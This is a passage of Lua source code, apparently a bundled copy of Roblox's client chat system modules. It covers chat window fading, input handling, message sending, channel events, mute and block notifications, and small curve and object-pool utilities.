		--////////////////////////////////////////////////////////////////////////////////////////////
		function CheckIfPointIsInSquare(checkPos, topLeft, bottomRight)
			return (topLeft.X <= checkPos.X and checkPos.X <= bottomRight.X and
				topLeft.Y <= checkPos.Y and checkPos.Y <= bottomRight.Y)
		end
		
		local backgroundIsFaded = false
		local textIsFaded = false
		local lastTextFadeTime = 0
		local lastBackgroundFadeTime = 0
		
		local fadedChanged = Instance.new("BindableEvent")
		local mouseStateChanged = Instance.new("BindableEvent")
		local chatBarFocusChanged = Instance.new("BindableEvent")
		
		function DoBackgroundFadeIn(setFadingTime)
			lastBackgroundFadeTime = tick()
			backgroundIsFaded = false
			fadedChanged:Fire()
			ChatWindow:FadeInBackground((setFadingTime or ChatSettings.ChatDefaultFadeDuration))
		
			local currentChannelObject = ChatWindow:GetCurrentChannel()
			if (currentChannelObject) then
		
				local Scroller = MessageLogDisplay.Scroller
				Scroller.ScrollingEnabled = true
				Scroller.ScrollBarThickness = moduleMessageLogDisplay.ScrollBarThickness
			end
		end
		
		function DoBackgroundFadeOut(setFadingTime)
			lastBackgroundFadeTime = tick()
			backgroundIsFaded = true
			fadedChanged:Fire()
			ChatWindow:FadeOutBackground((setFadingTime or ChatSettings.ChatDefaultFadeDuration))
		
			local currentChannelObject = ChatWindow:GetCurrentChannel()
			if (currentChannelObject) then
		
				local Scroller = MessageLogDisplay.Scroller
				Scroller.ScrollingEnabled = false
				Scroller.ScrollBarThickness = 0
			end
		end
		
		function DoTextFadeIn(setFadingTime)
			lastTextFadeTime = tick()
			textIsFaded = false
			fadedChanged:Fire()
			ChatWindow:FadeInText((setFadingTime or ChatSettings.ChatDefaultFadeDuration) * 0)
		end
		
		function DoTextFadeOut(setFadingTime)
			lastTextFadeTime = tick()
			textIsFaded = true
			fadedChanged:Fire()
			ChatWindow:FadeOutText((setFadingTime or ChatSettings.ChatDefaultFadeDuration))
		end
		
		function DoFadeInFromNewInformation()
			DoTextFadeIn()
			if ChatSettings.ChatShouldFadeInFromNewInformation then
				DoBackgroundFadeIn()
			end
		end
		
		function InstantFadeIn()
			DoBackgroundFadeIn(0)
			DoTextFadeIn(0)
		end
		
		function InstantFadeOut()
			DoBackgroundFadeOut(0)
			DoTextFadeOut(0)
		end
		
		local mouseIsInWindow = nil
		function UpdateFadingForMouseState(mouseState)
			mouseIsInWindow = mouseState
		
			mouseStateChanged:Fire()
		
			if (ChatBar:IsFocused()) then return end
		
			if (mouseState) then
				DoBackgroundFadeIn()
				DoTextFadeIn()
			else
				DoBackgroundFadeIn()
			end
		end
		
		
		spawn(function()
			while true do
				RunService.RenderStepped:wait()
		
				while (mouseIsInWindow or ChatBar:IsFocused()) do
					if (mouseIsInWindow) then
						mouseStateChanged.Event:wait()
					end
					if (ChatBar:IsFocused()) then
						chatBarFocusChanged.Event:wait()
					end
				end
		
				if (not backgroundIsFaded) then
					local timeDiff = tick() - lastBackgroundFadeTime
					if (timeDiff > ChatSettings.ChatWindowBackgroundFadeOutTime) then
						DoBackgroundFadeOut()
					end
		
				elseif (not textIsFaded) then
					local timeDiff = tick() - lastTextFadeTime
					if (timeDiff > ChatSettings.ChatWindowTextFadeOutTime) then
						DoTextFadeOut()
					end
		
				else
					fadedChanged.Event:wait()
		
				end
		
			end
		end)
		
		function getClassicChatEnabled()
			if ChatSettings.ClassicChatEnabled ~= nil then
				return ChatSettings.ClassicChatEnabled
			end
			return Players.ClassicChat
		end
		
		function getBubbleChatEnabled()
			if ChatSettings.BubbleChatEnabled ~= nil then
				return ChatSettings.BubbleChatEnabled
			end
			return Players.BubbleChat
		end
		
		function bubbleChatOnly()
		 	return not getClassicChatEnabled() and getBubbleChatEnabled()
		end
		
		function UpdateMousePosition(mousePos, ignoreForFadeIn)
			if not (moduleApiTable.Visible and moduleApiTable.IsCoreGuiEnabled and (moduleApiTable.TopbarEnabled or ChatSettings.ChatOnWithTopBarOff)) then return end
		
			if bubbleChatOnly() then
				return
			end
		
			local windowPos = ChatWindow.GuiObject.AbsolutePosition
			local windowSize = ChatWindow.GuiObject.AbsoluteSize
		
			local newMouseState = CheckIfPointIsInSquare(mousePos, windowPos, windowPos + windowSize)
		
			if FFlagFixChatWindowHoverOver then
				if ignoreForFadeIn and newMouseState == true then
					return
				end
			end
		
			if (newMouseState ~= mouseIsInWindow) then
				UpdateFadingForMouseState(newMouseState)
			end
		end
		
		UserInputService.InputChanged:connect(function(inputObject, gameProcessedEvent)
			if (inputObject.UserInputType == Enum.UserInputType.MouseMovement) then
				local mousePos = Vector2.new(inputObject.Position.X, inputObject.Position.Y)
				UpdateMousePosition(mousePos, --[[ ignoreForFadeIn = ]] gameProcessedEvent)
			end
		end)
		
		UserInputService.TouchTap:connect(function(tapPos, gameProcessedEvent)
			UpdateMousePosition(tapPos[1], --[[ ignoreForFadeIn = ]] false)
		end)
		
		UserInputService.TouchMoved:connect(function(inputObject, gameProcessedEvent)
			local tapPos = Vector2.new(inputObject.Position.X, inputObject.Position.Y)
			UpdateMousePosition(tapPos, --[[ ignoreForFadeIn = ]] false)
		end)
		
		if not FFlagFixMouseCapture then
			UserInputService.Changed:connect(function(prop)
				if prop == "MouseBehavior" then
					if UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
						local windowPos = ChatWindow.GuiObject.AbsolutePosition
						local windowSize = ChatWindow.GuiObject.AbsoluteSize
						local screenSize = GuiParent.AbsoluteSize
		
						local centerScreenIsInWindow = CheckIfPointIsInSquare(screenSize/2, windowPos, windowPos + windowSize)
						if centerScreenIsInWindow then
							UserInputService.MouseBehavior = Enum.MouseBehavior.Default
						end
					end
				end
			end)
		end
		
		--// Start and stop fading sequences / timers
		UpdateFadingForMouseState(true)
		UpdateFadingForMouseState(false)
		
		
		--////////////////////////////////////////////////////////////////////////////////////////////
		--///////////// Code to talk to topbar and maintain set/get core backwards compatibility stuff
		--////////////////////////////////////////////////////////////////////////////////////////////
		local Util = {}
		do
			function Util.Signal()
				local sig = {}
		
				local mSignaler = Instance.new('BindableEvent')
		
				local mArgData = nil
				local mArgDataCount = nil
		
				function sig:fire(...)
					mArgData = {...}
					mArgDataCount = select('#', ...)
					mSignaler:Fire()
				end
		
				function sig:connect(f)
					if not f then error("connect(nil)", 2) end
					return mSignaler.Event:connect(function()
						f(unpack(mArgData, 1, mArgDataCount))
					end)
				end
		
				function sig:wait()
					mSignaler.Event:wait()
					assert(mArgData, "Missing arg data, likely due to :TweenSize/Position corrupting threadrefs.")
					return unpack(mArgData, 1, mArgDataCount)
				end
		
				return sig
			end
		end
		
		
		function SetVisibility(val)
			ChatWindow:SetVisible(val)
			moduleApiTable.VisibilityStateChanged:fire(val)
			moduleApiTable.Visible = val
		
			if (moduleApiTable.IsCoreGuiEnabled) then
				if (val) then
					InstantFadeIn()
				else
					InstantFadeOut()
				end
			end
		end
		
		do
			moduleApiTable.TopbarEnabled = true
			moduleApiTable.MessageCount = 0
			moduleApiTable.Visible = true
			moduleApiTable.IsCoreGuiEnabled = true
		
			function moduleApiTable:ToggleVisibility()
				SetVisibility(not ChatWindow:GetVisible())
			end
		
			function moduleApiTable:SetVisible(visible)
				if (ChatWindow:GetVisible() ~= visible) then
					SetVisibility(visible)
				end
			end
		
			function moduleApiTable:FocusChatBar()
				ChatBar:CaptureFocus()
			end
		
			function moduleApiTable:EnterWhisperState(player)
				ChatBar:EnterWhisperState(player)
			end
		
			function moduleApiTable:GetVisibility()
				return ChatWindow:GetVisible()
			end
		
			function moduleApiTable:GetMessageCount()
				return self.MessageCount
			end
		
			function moduleApiTable:TopbarEnabledChanged(enabled)
				self.TopbarEnabled = enabled
				self.CoreGuiEnabled:fire(game:GetService("StarterGui"):GetCoreGuiEnabled(Enum.CoreGuiType.Chat))
			end
		
			function moduleApiTable:IsFocused(useWasFocused)
				return ChatBar:IsFocused()
			end
		
			moduleApiTable.ChatBarFocusChanged = Util.Signal()
			moduleApiTable.VisibilityStateChanged = Util.Signal()
			moduleApiTable.MessagesChanged = Util.Signal()
		
		
			moduleApiTable.MessagePosted = Util.Signal()
			moduleApiTable.CoreGuiEnabled = Util.Signal()
		
			moduleApiTable.ChatMakeSystemMessageEvent = Util.Signal()
			moduleApiTable.ChatWindowPositionEvent = Util.Signal()
			moduleApiTable.ChatWindowSizeEvent = Util.Signal()
			moduleApiTable.ChatBarDisabledEvent = Util.Signal()
		
		
			function moduleApiTable:fChatWindowPosition()
				return ChatWindow.GuiObject.Position
			end
		
			function moduleApiTable:fChatWindowSize()
				return ChatWindow.GuiObject.Size
			end
		
			function moduleApiTable:fChatBarDisabled()
				return not ChatBar:GetEnabled()
			end
		
		    if FFlagUserHandleChatHotKeyWithContextActionService then
		        local TOGGLE_CHAT_ACTION_NAME = "ToggleChat"
		
		        -- Callback when chat hotkey is pressed
		        local function handleAction(actionName, inputState, inputObject)
		            if actionName == TOGGLE_CHAT_ACTION_NAME and inputState == Enum.UserInputState.Begin and canChat and inputObject.UserInputType == Enum.UserInputType.Keyboard then
		                DoChatBarFocus()
		            end
		        end
		        ContextActionService:BindAction(TOGGLE_CHAT_ACTION_NAME, handleAction, true, Enum.KeyCode.Slash)
		    else
		        function moduleApiTable:SpecialKeyPressed(key, modifiers)
		            if (key == Enum.SpecialKey.ChatHotkey) then
		                if canChat then
		                    DoChatBarFocus()
		                end
		            end
		        end
		    end
		end
		
		moduleApiTable.CoreGuiEnabled:connect(function(enabled)
			moduleApiTable.IsCoreGuiEnabled = enabled
		
			enabled = enabled and (moduleApiTable.TopbarEnabled or ChatSettings.ChatOnWithTopBarOff)
		
			ChatWindow:SetCoreGuiEnabled(enabled)
		
			if (not enabled) then
				ChatBar:ReleaseFocus()
				InstantFadeOut()
			else
				InstantFadeIn()
			end
		end)
		
		function trimTrailingSpaces(str)
			local lastSpace = #str
			while lastSpace > 0 do
				--- The pattern ^%s matches whitespace at the start of the string. (Starting from lastSpace)
				if str:find("^%s", lastSpace) then
					lastSpace = lastSpace - 1
				else
					break
				end
			end
			return str:sub(1, lastSpace)
		end
		
		moduleApiTable.ChatMakeSystemMessageEvent:connect(function(valueTable)
			if (valueTable["Text"] and type(valueTable["Text"]) == "string") then
				while (not DidFirstChannelsLoads) do wait() end
		
				local channel = ChatSettings.GeneralChannelName
				local channelObj = ChatWindow:GetChannel(channel)
		
				if (channelObj) then
					local messageObject = {
						ID = -1,
						FromSpeaker = nil,
						SpeakerUserId = 0,
						OriginalChannel = channel,
						IsFiltered = true,
						MessageLength = string.len(valueTable.Text),
						MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(valueTable.Text)),
						Message = trimTrailingSpaces(valueTable.Text),
						MessageType = ChatConstants.MessageTypeSetCore,
						Time = os.time(),
						ExtraData = valueTable,
					}
					channelObj:AddMessageToChannel(messageObject)
					ChannelsBar:UpdateMessagePostedInChannel(channel)
		
					moduleApiTable.MessageCount = moduleApiTable.MessageCount + 1
					moduleApiTable.MessagesChanged:fire(moduleApiTable.MessageCount)
				end
			end
		end)
		
		moduleApiTable.ChatBarDisabledEvent:connect(function(disabled)
			if canChat then
				ChatBar:SetEnabled(not disabled)
				if (disabled) then
					ChatBar:ReleaseFocus()
				end
			end
		end)
		
		moduleApiTable.ChatWindowSizeEvent:connect(function(size)
			ChatWindow.GuiObject.Size = size
		end)
		
		moduleApiTable.ChatWindowPositionEvent:connect(function(position)
			ChatWindow.GuiObject.Position = position
		end)
		
		--////////////////////////////////////////////////////////////////////////////////////////////
		--///////////////////////////////////////////////// Code to hook client UI up to server events
		--////////////////////////////////////////////////////////////////////////////////////////////
		
		function DoChatBarFocus()
			if (not ChatWindow:GetCoreGuiEnabled()) then return end
			if (not ChatBar:GetEnabled()) then return end
		
			if (not ChatBar:IsFocused() and ChatBar:GetVisible()) then
				moduleApiTable:SetVisible(true)
				InstantFadeIn()
				ChatBar:CaptureFocus()
				moduleApiTable.ChatBarFocusChanged:fire(true)
			end
		end
		
		chatBarFocusChanged.Event:connect(function(focused)
			moduleApiTable.ChatBarFocusChanged:fire(focused)
		end)
		
		function DoSwitchCurrentChannel(targetChannel)
			if (ChatWindow:GetChannel(targetChannel)) then
				ChatWindow:SwitchCurrentChannel(targetChannel)
			end
		end
		
		function SendMessageToSelfInTargetChannel(message, channelName, extraData)
			local channelObj = ChatWindow:GetChannel(channelName)
			if (channelObj) then
				local messageData =
				{
					ID = -1,
					FromSpeaker = nil,
					SpeakerUserId = 0,
					OriginalChannel = channelName,
					IsFiltered = true,
					MessageLength = string.len(message),
					MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(message)),
					Message = trimTrailingSpaces(message),
					MessageType = ChatConstants.MessageTypeSystem,
					Time = os.time(),
					ExtraData = extraData,
				}
		
				channelObj:AddMessageToChannel(messageData)
			end
		end
		
		function chatBarFocused()
			if (not mouseIsInWindow) then
				DoBackgroundFadeIn()
				if (textIsFaded) then
					DoTextFadeIn()
				end
			end
		
			chatBarFocusChanged:Fire(true)
		end
		
		--// Event for making player say chat message.
		function chatBarFocusLost(enterPressed, inputObject)
			DoBackgroundFadeIn()
			chatBarFocusChanged:Fire(false)
		
			if (enterPressed) then
				local message = ChatBar:GetTextBox().Text
		
				if ChatBar:IsInCustomState() then
					local customMessage = ChatBar:GetCustomMessage()
					if customMessage then
						message = customMessage
					end
					local messageSunk = ChatBar:CustomStateProcessCompletedMessage(message)
					ChatBar:ResetCustomState()
					if messageSunk then
						return
					end
				end
		
				ChatBar:GetTextBox().Text = ""
		
				if message ~= "" then
					--// Sends signal to eventually call Player:Chat() to handle C++ side legacy stuff.
					moduleApiTable.MessagePosted:fire(message)
		
					if not CommandProcessor:ProcessCompletedChatMessage(message, ChatWindow) then
						if ChatSettings.DisallowedWhiteSpace then
							for i = 1, #ChatSettings.DisallowedWhiteSpace do
								if ChatSettings.DisallowedWhiteSpace[i] == "\t" then
									message = string.gsub(message, ChatSettings.DisallowedWhiteSpace[i], " ")
								else
									message = string.gsub(message, ChatSettings.DisallowedWhiteSpace[i], "")
								end
							end
						end
						message = string.gsub(message, "\n", "")
						message = string.gsub(message, "[ ]+", " ")
		
						local targetChannel = ChatWindow:GetTargetMessageChannel()
						if targetChannel then
							MessageSender:SendMessage(message, targetChannel)
						else
							MessageSender:SendMessage(message, nil)
						end
					end
				end
		
			end
		end
		
		local ChatBarConnections = {}
		function setupChatBarConnections()
			for i = 1, #ChatBarConnections do
				ChatBarConnections[i]:Disconnect()
			end
			ChatBarConnections = {}
		
			local focusLostConnection = ChatBar:GetTextBox().FocusLost:connect(chatBarFocusLost)
			table.insert(ChatBarConnections, focusLostConnection)
		
			local focusGainedConnection = ChatBar:GetTextBox().Focused:connect(chatBarFocused)
			table.insert(ChatBarConnections, focusGainedConnection)
		end
		
		setupChatBarConnections()
		ChatBar.GuiObjectsChanged:connect(setupChatBarConnections)
		
		function getEchoMessagesInGeneral()
			if ChatSettings.EchoMessagesInGeneralChannel == nil then
				return true
			end
			return ChatSettings.EchoMessagesInGeneralChannel
		end
		
		EventFolder.OnMessageDoneFiltering.OnClientEvent:connect(function(messageData)
			if not ChatSettings.ShowUserOwnFilteredMessage then
				if messageData.FromSpeaker == LocalPlayer.Name then
					return
				end
			end
		
			local channelName = messageData.OriginalChannel
			local channelObj = ChatWindow:GetChannel(channelName)
			if channelObj then
				channelObj:UpdateMessageFiltered(messageData)
			end
		
			if getEchoMessagesInGeneral() and ChatSettings.GeneralChannelName and channelName ~= ChatSettings.GeneralChannelName then
				local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
				if generalChannel then
					generalChannel:UpdateMessageFiltered(messageData)
				end
			end
		end)
		
		EventFolder.OnNewMessage.OnClientEvent:connect(function(messageData, channelName)
			local channelObj = ChatWindow:GetChannel(channelName)
			if (channelObj) then
				channelObj:AddMessageToChannel(messageData)
		
				if (messageData.FromSpeaker ~= LocalPlayer.Name) then
					ChannelsBar:UpdateMessagePostedInChannel(channelName)
				end
		
				if getEchoMessagesInGeneral() and ChatSettings.GeneralChannelName and channelName ~= ChatSettings.GeneralChannelName then
					local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
					if generalChannel then
						generalChannel:AddMessageToChannel(messageData)
					end
				end
		
				moduleApiTable.MessageCount = moduleApiTable.MessageCount + 1
				moduleApiTable.MessagesChanged:fire(moduleApiTable.MessageCount)
		
				DoFadeInFromNewInformation()
			end
		end)
		
		EventFolder.OnNewSystemMessage.OnClientEvent:connect(function(messageData, channelName)
			channelName = channelName or "System"
		
			local channelObj = ChatWindow:GetChannel(channelName)
			if (channelObj) then
				channelObj:AddMessageToChannel(messageData)
		
				ChannelsBar:UpdateMessagePostedInChannel(channelName)
		
				moduleApiTable.MessageCount = moduleApiTable.MessageCount + 1
				moduleApiTable.MessagesChanged:fire(moduleApiTable.MessageCount)
		
				DoFadeInFromNewInformation()
		
				if getEchoMessagesInGeneral() and ChatSettings.GeneralChannelName and channelName ~= ChatSettings.GeneralChannelName then
					local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
					if generalChannel then
						generalChannel:AddMessageToChannel(messageData)
					end
				end
			else
				warn(string.format("Just received system message for channel I'm not in [%s]", channelName))
			end
		end)
		
		
		function HandleChannelJoined(channel, welcomeMessage, messageLog, channelNameColor, addHistoryToGeneralChannel,
			addWelcomeMessageToGeneralChannel)
			if ChatWindow:GetChannel(channel) then
				--- If the channel has already been added, remove it first.
				ChatWindow:RemoveChannel(channel)
			end
		
			if (channel == ChatSettings.GeneralChannelName) then
				DidFirstChannelsLoads = true
			end
		
			if channelNameColor then
				ChatBar:SetChannelNameColor(channel, channelNameColor)
			end
		
			local channelObj = ChatWindow:AddChannel(channel)
		
			if (channelObj) then
				if (channel == ChatSettings.GeneralChannelName) then
					DoSwitchCurrentChannel(channel)
				end
		
				if (messageLog) then
					local startIndex = 1
					if #messageLog > ChatSettings.MessageHistoryLengthPerChannel then
						startIndex = #messageLog - ChatSettings.MessageHistoryLengthPerChannel
					end
		
					for i = startIndex, #messageLog do
						channelObj:AddMessageToChannel(messageLog[i])
					end
		
					if getEchoMessagesInGeneral() and addHistoryToGeneralChannel then
						if ChatSettings.GeneralChannelName and channel ~= ChatSettings.GeneralChannelName then
							local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
							if generalChannel then
								generalChannel:AddMessagesToChannelByTimeStamp(messageLog, startIndex)
							end
						end
					end
				end
		
				if (welcomeMessage ~= "") then
					local welcomeMessageObject = {
						ID = -1,
						FromSpeaker = nil,
						SpeakerUserId = 0,
						OriginalChannel = channel,
						IsFiltered = true,
						MessageLength = string.len(welcomeMessage),
						MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(welcomeMessage)),
						Message = trimTrailingSpaces(welcomeMessage),
						MessageType = ChatConstants.MessageTypeWelcome,
						Time = os.time(),
						ExtraData = nil,
					}
					channelObj:AddMessageToChannel(welcomeMessageObject)
		
					if getEchoMessagesInGeneral() and addWelcomeMessageToGeneralChannel and not ChatSettings.ShowChannelsBar then
						if channel ~= ChatSettings.GeneralChannelName then
							local generalChannel = ChatWindow:GetChannel(ChatSettings.GeneralChannelName)
							if generalChannel then
								generalChannel:AddMessageToChannel(welcomeMessageObject)
							end
						end
					end
				end
		
				DoFadeInFromNewInformation()
			end
		
		end
		
		EventFolder.OnChannelJoined.OnClientEvent:connect(function(channel, welcomeMessage, messageLog, channelNameColor)
			HandleChannelJoined(channel, welcomeMessage, messageLog, channelNameColor, false, true)
		end)
		
		EventFolder.OnChannelLeft.OnClientEvent:connect(function(channel)
			ChatWindow:RemoveChannel(channel)
		
			DoFadeInFromNewInformation()
		end)
		
		EventFolder.OnMuted.OnClientEvent:connect(function(channel)
			--// Do something eventually maybe?
			--// This used to take away the chat bar in channels the player was muted in.
			--// We found out this behavior was inconvenient for doing chat commands though.
		end)
		
		EventFolder.OnUnmuted.OnClientEvent:connect(function(channel)
			--// Same as above.
		end)
		
		EventFolder.OnMainChannelSet.OnClientEvent:connect(function(channel)
			DoSwitchCurrentChannel(channel)
		end)
		
		coroutine.wrap(function()
			-- ChannelNameColorUpdated may not exist if the client version is older than the server version.
			local ChannelNameColorUpdated = DefaultChatSystemChatEvents:WaitForChild("ChannelNameColorUpdated", 5)
			if ChannelNameColorUpdated then
				ChannelNameColorUpdated.OnClientEvent:connect(function(channelName, channelNameColor)
					ChatBar:SetChannelNameColor(channelName, channelNameColor)
				end)
			end
		end)()
		
		
		--- Interaction with SetCore Player events.
		
		local PlayerBlockedEvent = nil
		local PlayerMutedEvent = nil
		local PlayerUnBlockedEvent = nil
		local PlayerUnMutedEvent = nil
		
		
		-- This is pcalled because the SetCore methods may not be released yet.
		pcall(function()
			PlayerBlockedEvent = StarterGui:GetCore("PlayerBlockedEvent")
			PlayerMutedEvent = StarterGui:GetCore("PlayerMutedEvent")
			PlayerUnBlockedEvent = StarterGui:GetCore("PlayerUnblockedEvent")
			PlayerUnMutedEvent = StarterGui:GetCore("PlayerUnmutedEvent")
		end)
		
		function SendSystemMessageToSelf(message)
			local currentChannel = ChatWindow:GetCurrentChannel()
		
			if currentChannel then
				local messageData =
				{
					ID = -1,
					FromSpeaker = nil,
					SpeakerUserId = 0,
					OriginalChannel = currentChannel.Name,
					IsFiltered = true,
					MessageLength = string.len(message),
					MessageLengthUtf8 = utf8.len(utf8.nfcnormalize(message)),
					Message = trimTrailingSpaces(message),
					MessageType = ChatConstants.MessageTypeSystem,
					Time = os.time(),
					ExtraData = nil,
				}
		
				currentChannel:AddMessageToChannel(messageData)
			end
		end
		
		function MutePlayer(player)
			local mutePlayerRequest = DefaultChatSystemChatEvents:FindFirstChild("MutePlayerRequest")
			if mutePlayerRequest then
				return mutePlayerRequest:InvokeServer(player.Name)
			end
			return false
		end
		
		if PlayerBlockedEvent then
			PlayerBlockedEvent.Event:connect(function(player)
				if MutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenBlocked",
								string.format("Speaker '%s' has been blocked.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		if PlayerMutedEvent then
			PlayerMutedEvent.Event:connect(function(player)
				if MutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenMuted",
								string.format("Speaker '%s' has been muted.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		function UnmutePlayer(player)
			local unmutePlayerRequest = DefaultChatSystemChatEvents:FindFirstChild("UnMutePlayerRequest")
			if unmutePlayerRequest then
				return unmutePlayerRequest:InvokeServer(player.Name)
			end
			return false
		end
		
		if PlayerUnBlockedEvent then
			PlayerUnBlockedEvent.Event:connect(function(player)
				if UnmutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenUnBlocked",
								string.format("Speaker '%s' has been unblocked.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		if PlayerUnMutedEvent then
			PlayerUnMutedEvent.Event:connect(function(player)
				if UnmutePlayer(player) then
					local playerName
		
					if ChatSettings.PlayerDisplayNamesEnabled then
						playerName = player.DisplayName
					else
						playerName = player.Name
					end
		
					SendSystemMessageToSelf(
						string.gsub(
							ChatLocalization:Get(
								"GameChat_ChatMain_SpeakerHasBeenUnMuted",
								string.format("Speaker '%s' has been unmuted.", playerName)
							),
							"{RBX_NAME}", playerName
						)
					)
				end
			end)
		end
		
		-- Get a list of blocked users from the corescripts.
		-- Spawned because this method can yeild.
		spawn(function()
			-- Pcalled because this method is not released on all platforms yet.
			if LocalPlayer.UserId > 0 then
				pcall(function()
					local blockedUserIds = StarterGui:GetCore("GetBlockedUserIds")
					if #blockedUserIds > 0 then
						local setInitalBlockedUserIds = DefaultChatSystemChatEvents:FindFirstChild("SetBlockedUserIdsRequest")
						if setInitalBlockedUserIds then
							setInitalBlockedUserIds:FireServer(blockedUserIds)
						end
					end
				end)
			end
		end)
		
		spawn(function()
			local success, canLocalUserChat = pcall(function()
				return Chat:CanUserChatAsync(LocalPlayer.UserId)
			end)
			if success then
				canChat = RunService:IsStudio() or canLocalUserChat
			end
		end)
		
		local initData = EventFolder.GetInitDataRequest:InvokeServer()
		
		-- Handle joining general channel first.
		for i, channelData in pairs(initData.Channels) do
			if channelData[1] == ChatSettings.GeneralChannelName then
				HandleChannelJoined(channelData[1], channelData[2], channelData[3], channelData[4], true, false)
			end
		end
		
		for i, channelData in pairs(initData.Channels) do
			if channelData[1] ~= ChatSettings.GeneralChannelName then
				HandleChannelJoined(channelData[1], channelData[2], channelData[3], channelData[4], true, false)
			end
		end
		
		return moduleApiTable
		
	end[curve_util] = function()
		local CurveUtil = {	}
		local DEFAULT_THRESHOLD = 0.01
		
		function CurveUtil:Expt(start, to, pct, dt_scale)
			if math.abs(to - start) < DEFAULT_THRESHOLD then
				return to
			end
		
			local y = CurveUtil:Expty(start,to,pct,dt_scale)
		
			--rtv = start + (to - start) * timescaled_friction--
			local delta = (to - start) * y
			return start + delta
		end
		
		function CurveUtil:Expty(start, to, pct, dt_scale)
			--y = e ^ (-a * timescale)--
			local friction = 1 - pct
			local a = -math.log(friction)
			return 1 - math.exp(-a * dt_scale)
		end
		
		function CurveUtil:Sign(val)
			if val > 0 then
				return 1
			elseif val < 0 then
				return -1
			else
				return 0
			end
		end
		
		function CurveUtil:BezierValForT(p0, p1, p2, p3, t)
			local cp0 = (1 - t) * (1 - t) * (1 - t)
			local cp1 = 3 * t * (1-t)*(1-t)
			local cp2 = 3 * t * t * (1 - t)
			local cp3 = t * t * t
			return cp0 * p0 + cp1 * p1 + cp2 * p2 + cp3 * p3
		end
		
		CurveUtil._BezierPt2ForT = { x = 0; y = 0 }
		function CurveUtil:BezierPt2ForT(
			p0x, p0y,
			p1x, p1y,
			p2x, p2y,
			p3x, p3y,
			t)
		
			CurveUtil._BezierPt2ForT.x = CurveUtil:BezierValForT(p0x,p1x,p2x,p3x,t)
			CurveUtil._BezierPt2ForT.y = CurveUtil:BezierValForT(p0y,p1y,p2y,p3y,t)
			return CurveUtil._BezierPt2ForT
		end
		
		function CurveUtil:YForPointOf2PtLine(pt1, pt2, x)
			--(y - y1)/(x - x1) = m--
			local m = (pt1.y - pt2.y) / (pt1.x - pt2.x)
			--y - mx = b--
			local b = pt1.y - m * pt1.x
			return m * x + b
		end
		
		function CurveUtil:DeltaTimeToTimescale(s_frame_delta_time)
			return s_frame_delta_time / (1.0 / 60.0)
		end
		
		function CurveUtil:SecondsToTick(sec)
			return (1 / 60.0) / sec
		end
		
		function CurveUtil:ExptValueInSeconds(threshold, start, seconds)
				return 1 - math.pow((threshold / start), 1 / (60.0 * seconds))
		end
		
		function CurveUtil:NormalizedDefaultExptValueInSeconds(seconds)
				return self:ExptValueInSeconds(DEFAULT_THRESHOLD, 1, seconds)
		end
		
		return CurveUtil
		
	end[message_sender] = function()
		--	// FileName: MessageSender.lua
		--	// Written by: Xsitsu
		--	// Description: Module to centralize sending message functionality.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local modulesFolder = script.Parent
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:SendMessage(message, toChannel)
			self.SayMessageRequest:FireServer(message, toChannel)
		end
		
		function methods:RegisterSayMessageFunction(func)
			self.SayMessageRequest = func
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new()
			local obj = setmetatable({}, methods)
			obj.SayMessageRequest = nil
		
			return obj
		end
		
		return module.new()
		
	end[object_pool] = function()
		--	// FileName: ObjectPool.lua
		--	// Written by: TheGamer101
		--	// Description: An object pool class used to avoid unnecessarily instantiating Instances.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		
		--////////////////////////////// Methods
		--//////////////////////////////////////
		local methods = {}
		methods.__index = methods
		
		function methods:GetInstance(className)
		  if self.InstancePoolsByClass[className] == nil then
		    self.InstancePoolsByClass[className] = {}
		  end
		  local availableInstances = #self.InstancePoolsByClass[className]
		  if availableInstances > 0 then
		    local instance = self.InstancePoolsByClass[className][availableInstances]
		    table.remove(self.InstancePoolsByClass[className])
		    return instance
		  end
		  return Instance.new(className)
		end
		
		function methods:ReturnInstance(instance)
		  if self.InstancePoolsByClass[instance.ClassName] == nil then
		    self.InstancePoolsByClass[instance.ClassName] = {}
		  end
		  if #self.InstancePoolsByClass[instance.ClassName] < self.PoolSizePerType then
		    table.insert(self.InstancePoolsByClass[instance.ClassName], instance)
		  else
		    instance:Destroy()
		  end
		end
		
		--///////////////////////// Constructors
		--//////////////////////////////////////
		
		function module.new(poolSizePerType)
			local obj = setmetatable({}, methods)
			obj.InstancePoolsByClass = {}
			obj.Name = "ObjectPool"
		  obj.PoolSizePerType = poolSizePerType
		
			return obj
		end
		
		return module
		
	end[channels_tab] = function()
		--	// FileName: ChannelsTab.lua
		--	// Written by: Xsitsu
		--	// Description: Channel tab button for selecting current channel and also displaying if currently selected.
		
		local module = {}
		--////////////////////////////// Include
		--//////////////////////////////////////
		local Chat = game:GetService("Chat")
		local clientChatModules = Chat:WaitForChild("ClientChatModules")
		local modulesFolder = script.Parent
		local ChatSettings = require(clientChatModules:WaitForChild("ChatSettings"))
